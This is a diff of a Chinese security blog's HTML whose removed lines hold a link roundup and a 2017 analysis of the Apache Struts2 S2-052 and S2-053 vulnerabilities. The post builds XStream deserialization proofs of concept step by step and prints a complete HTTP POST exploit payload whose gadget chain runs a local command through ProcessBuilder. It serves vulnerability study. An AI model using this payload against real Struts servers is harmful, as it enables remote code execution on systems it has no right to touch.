-<li>除了拖拽（Drag’n’Drop），VMware 还有哪些攻击面？Comsecuris 去年为了准备 Pwn2Own 开始挖掘 VMware 的漏洞，可惜最后由于时间原因没能赶上。这篇 Blog 来自他们对 Vmware 攻击界面的剖析以及他们发现的漏洞<br><a href="https://comsecuris.com/blog/posts/vmware_vgpu_shader_vulnerabilities/" target="_blank" rel="external">https://comsecuris.com/blog/posts/vmware_vgpu_shader_vulnerabilities/</a></li>
-<li>pyDHE：一个完整的Python Diffie-Hellman库<br><a href="https://github.com/deadPix3l/pyDHE" target="_blank" rel="external">https://github.com/deadPix3l/pyDHE</a></li>
-<li>在Windows中枚举进程，线程和映像加载通知回调例程<br><a href="http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html" target="_blank" rel="external">http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html</a></li>
-<li>针对Flash应用程序的渗透测试<br><a href="https://privsec.blog/penetration-testing-flash-apps-aka-how-to-cheat-at-blackjack/" target="_blank" rel="external">https://privsec.blog/penetration-testing-flash-apps-aka-how-to-cheat-at-blackjack/</a></li>
-<li>githubscan：GitHub敏感信息扫描工具<br><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="external">https://github.com/lianfeng30/githubscan</a></li>
-<li>挖漏洞的高级方法<br><a href="http://jackson.thuraisamy.me/finding-vulnerabilities.html" target="_blank" rel="external">http://jackson.thuraisamy.me/finding-vulnerabilities.html</a></li>
-<li><p>LaZagne：浏览器密码凭证获取<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">很早就关注的一个项目了，还一直在更新。</div></pre></td></tr></table></figure>
-</li>
-<li><p>CVE-2016-0040：Privilege Escalation Exploit For WMI Receive Notification Vulnerability (x86-64)<br><https: github.com="" de7ec7ed="" cve-2016-0040=""></https:></p>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/17/struts-052和struts-053分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="M0rk">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="M0rk's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/09/17/struts-052和struts-053分析/" itemprop="url">
-                  struts-052和struts-053分析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-17T17:07:22+08:00">
-                2017-09-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。</p>
-<h4 id="s2-052"><a href="#s2-052" class="headerlink" title="s2-052"></a>s2-052</h4><p><a href="struts2-rest-showcase.war">漏洞war包下载</a><br><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="external">官方通告</a><br>在分析这个漏洞之前，先补补基础知识。<br><br>了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化为java对象。<br><br>我之前分析过json序列化和反序列化时常用的几种方法，今天我也学习一下xml序列化和反序列化的方法，目前来说有两种，一种是XMLDecoder，另外一下是使用xstream，xstream使用的比较早的多，然后这次的s2-052就是利用的xstream。<br><br><br>xstream反序列化的问题由来已久，早在四年前，老外就在defcon中讲述了这个问题<a href="https://www.youtube.com/watch?v=L6gXSiGtoqg" target="_blank" rel="external">link</a>，而且之前jenkins的反序列化漏洞也是和xstream有关。<br><br><img src="/2017/09/17/struts-052和struts-053分析/xmlGenMain.png" alt=""><br>我们可以看到，通过XMLGenerator.generateXML的方法就进行了序列化，而通过XMLGenerator.generateTOfromXML就进行了反序列化。这个XMLGenerator类的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public final class XMLGenerator &#123;</div><div class="line">/*</div><div class="line"> * this class is for generating XML </div><div class="line"> */</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * initialization of XStream class </div><div class="line">  */</div><div class="line"> private static XStream xstream = new XStream(new DomDriver())</div><div class="line"> &#123;&#123;</div><div class="line">  processAnnotations(Square.class);</div><div class="line">  processAnnotations(Rectangle.class);</div><div class="line"> &#125;&#125;;</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * This class is for generating XML from MODEL class</div><div class="line">  * @param Object</div><div class="line">  * @return String </div><div class="line">  */</div><div class="line"> public static String generateXML(Object to) &#123;</div><div class="line">  return null == to ? &quot;&quot; : xstream.toXML(to);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> /*</div><div class="line">  * Generates the transfer object from the given XML using XStream.</div><div class="line">  * </div><div class="line">  * @param String</div><div class="line">  * @return transfer object</div><div class="line">  */</div><div class="line"> public static Object generateTOfromXML(String xml) &#123;</div><div class="line">  return xstream.fromXML(xml);</div><div class="line"> &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这里就用到了XStream。<br>现在我们再来看一下这样的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public class xstreamPOC &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) </div><div class="line">	&#123;</div><div class="line">//		String payload = &quot;&lt;square&gt;&quot;+ </div><div class="line">//						 &quot;	&lt;size&gt;5&lt;/size&gt;&quot;+</div><div class="line">//						 &quot;&lt;/square&gt; &quot;;	</div><div class="line">		String payload = &quot;&lt;string&gt;&quot;+ </div><div class="line">				 		&quot;	hello&quot;+</div><div class="line">				 		 &quot;&lt;/string&gt; &quot;;</div><div class="line">		</div><div class="line">		String inputXML = payload;</div><div class="line">		</div><div class="line">		//Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">		//the next code is what the XMLGenerator.generateTOfromXML is doing:</div><div class="line">		XStream xstream = new XStream(new DomDriver())	</div><div class="line">											&#123;&#123;</div><div class="line">												processAnnotations(Square.class);</div><div class="line">												processAnnotations(Rectangle.class);</div><div class="line">											&#125;&#125;;		</div><div class="line">		Square sq1 = (Square)xstream.fromXML(inputXML);</div><div class="line">		</div><div class="line">		System.out.println(String.format(&quot;sq1: \n \n%s \n\n&quot;, sq1));</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p><img src="/2017/09/17/struts-052和struts-053分析/xstreamstring.png" alt=""><br>从上图可以看到，当我在序列化一个包含有string关键字的xml时候，他会首先产生一个string的类，然后强制转换成Square类。危险就为危险在这里了，XStream将创建定义在xml中的对象。<br><br>那么如果我们换成下面的payload呢<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </div><div class="line">		 &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</div><div class="line">		 &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;</div></pre></td></tr></table></figure></p>
-<p><img src="/2017/09/17/struts-052和struts-053分析/stringExec.png" alt=""><br>可以看到我们就会实例化这个ProcessBuilder这个类。但是呢，目前为止我们还是只能创建对象，并不能invoke他们，所以这个时候就需要动态代理和EventHandle这两个技巧了。<br>看下面这样的代码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import java.beans.EventHandler;</div><div class="line">import java.util.Set;</div><div class="line">import java.util.TreeSet;</div><div class="line"></div><div class="line">public class XStreamPoC &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) </div><div class="line">	&#123;		</div><div class="line">		Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();</div><div class="line">        set.add(&quot;foo&quot;);</div><div class="line"></div><div class="line">        set.add(EventHandler.create(Comparable.class, </div><div class="line">        			new ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;));</div><div class="line">		</div><div class="line">        String setXml = XMLGenerator.generateXML(set);</div><div class="line">		/*String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </div><div class="line">						 &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</div><div class="line">						 &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;		</div><div class="line">		</div><div class="line">		String inputXML = payload;</div><div class="line">		</div><div class="line">		Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">		//Object sq1 = XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">			</div><div class="line">		System.out.println(String.format(&quot;sq1 value: %s \n\nsq1 class: %s&quot;, sq1, sq1.getClass()));</div><div class="line">		 */</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p><img src="/2017/09/17/struts-052和struts-053分析/technique.png" alt=""><br>如上图所示，可以看到当转换发生异常的时候,就会执行start的操作。<br>介于此，我们的payload就可以这么写了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">import java.io.IOException;</div><div class="line">public class PoC_XMLGenerator &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) &#123;</div><div class="line">		// TODO Auto-generated method stub</div><div class="line"></div><div class="line">		String process = &quot;open&quot;; 		</div><div class="line">		String arguments = &quot;/Applications/Calculator.app&quot;;		</div><div class="line">		</div><div class="line">		String payload = &quot;&lt;sorted-set&gt;&quot; +  </div><div class="line">						 //&quot;&lt;string&gt;foo&lt;/string&gt;&quot; +</div><div class="line">						 &quot;&lt;dynamic-proxy&gt;&quot; + </div><div class="line">						 &quot;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&quot; +</div><div class="line">						 &quot;&lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;&quot; +</div><div class="line">						 &quot;    &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot; +</div><div class="line">						 &quot;         &lt;command&gt;&quot; +</div><div class="line">						 &quot;             &lt;string&gt;&quot; + process + &quot;&lt;/string&gt;&quot; +</div><div class="line">						 &quot;             &lt;string&gt;&quot; + arguments + &quot;&lt;/string&gt;&quot; +</div><div class="line">						 &quot;        &lt;/command&gt;&quot; +</div><div class="line">						 &quot;    &lt;/target&gt;&quot; +</div><div class="line">						 &quot;    &lt;action&gt;start&lt;/action&gt;&quot; +</div><div class="line">						 &quot;&lt;/handler&gt;&quot; + </div><div class="line">						 &quot;&lt;/dynamic-proxy&gt;&quot; + 						</div><div class="line">						&quot;&lt;/sorted-set&gt;&quot;;</div><div class="line">		</div><div class="line">		XMLGenerator.generateTOfromXML(payload);</div><div class="line">		</div><div class="line">		System.out.println(&quot;Will not get here&quot;);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>至此，XStream的利用点分析完了。下面再来看看struts2中的利用。<br><br>通过官方的一句话公告 A RCE attack is possible when using the Struts REST plugin with XStream handler to deserialise XML requests可以看出问题出在struts rest plugin，这个REST插件struts2-rest-plugin.jar用到了XStreamHandler这个类，这个类对http请求中content-type是application/xml的，会调用XStream进行处理。<br><img src="/2017/09/17/struts-052和struts-053分析/s2rest.png" alt=""><br>可以看到，当contenttype为xml的时候的处理类是XStreamHandler。那么我们就可以将恶意代码以xml为载体，通过Content-type为xml的方式，让XStreamHandler去进行序列化，那么这个时候就会触发漏洞。<br><br>最终payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3 HTTP/1.1</div><div class="line">Host: localhost:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2430</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;open&lt;/string&gt;</div><div class="line">                        &lt;string&gt;/Applications/Calculator.app&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure></p>
-<p><img src="/2017/09/17/struts-052和struts-053分析/exp.png" alt=""></p>
-<ul>
-<li>补丁对比<br><a href="https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264" target="_blank" rel="external">补丁代码</a><h4 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h4></li>
-<li>关于s2-053的漏洞问题是安全编码和习惯的问题,而非struts2通杀漏洞。<br><br><a href="http://struts.apache.org/docs/s2-053.html" target="_blank" rel="external">官方通告</a><br><img src="/2017/09/17/struts-052和struts-053分析/s2-053.png" alt=""></li>
-<li>较s2-052，s2-053漏洞更简单和直接。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
-<li><del>我还是喜欢用eclipse分析java漏洞。</del>，还是好像还是idea比较好用啊，只是从eclipse切换过来略蛋疼。切换过来之后，你会发现你的ide好像都要是JetBrains这个公司的了。</li>
-<li>基础还是不够牢固，给自己定个小计划，后面有时间把所有的s2漏洞分析一下。总结一下思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li>Standard way to serialize and deserialize Objects with XStream<br><a href="http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o" target="_blank" rel="external">http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o</a></li>
-<li>一步一步的构造payload<br><a href="https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java" target="_blank" rel="external">https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java</a></li>
-<li>XStream “Remote Code Execution” exploit on code from “Standard way to serialize and deserialize Objects with XStream” article<br><a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1" target="_blank" rel="external">http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1</a></li>
-<li>Struts2 S2-052 RCE分析与利用<br><a href="https://paper.seebug.org/383/" target="_blank" rel="external">https://paper.seebug.org/383/</a></li>
-<li>CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告<br><a href="https://yq.aliyun.com/articles/197926" target="_blank" rel="external">https://yq.aliyun.com/articles/197926</a></li>
-<li>S2-052漏洞分析及官方缓解措施无效验证<br><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="external">http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/</a></li>
-<li>Struts2 S2-052漏洞分析<br><a href="https://www.waitalone.cn/struts2-s2-052.html" target="_blank" rel="external">https://www.waitalone.cn/struts2-s2-052.html</a></li>
-<li>Struts2-052漏洞分析<br><a href="https://yaofeifly.github.io/2017/09/08/Struts2-052/" target="_blank" rel="external">https://yaofeifly.github.io/2017/09/08/Struts2-052/</a></li>
-<li>Apache Struts2 Remote Code Execution (S2-053)<br><a href="http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/" target="_blank" rel="external">http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/</a></li>
-<li>S2-053 复现分析过程(附POC)<br><a href="https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA" target="_blank" rel="external">https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA</a></li>
-<li>Struts 2 S2-053漏洞分析（附POC）<br><a href="http://www.freebuf.com/vuls/147735.html" target="_blank" rel="external">http://www.freebuf.com/vuls/147735.html</a></li>
-<li>来自McAfee对s2-052的分析<br><a href="https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/" target="_blank" rel="external">https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/</a></li>
-<li>GCC 合并了我写的代码，从编译器开始解决安全问题。来自嘶吼，作者为吴潍浠<br><a href="http://www.4hou.com/binary/7688.html" target="_blank" rel="external">http://www.4hou.com/binary/7688.html</a></li>
 </ul>
 
           
@@ -1722,7 +1696,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">141</span>
+                <span class="site-state-item-count">143</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
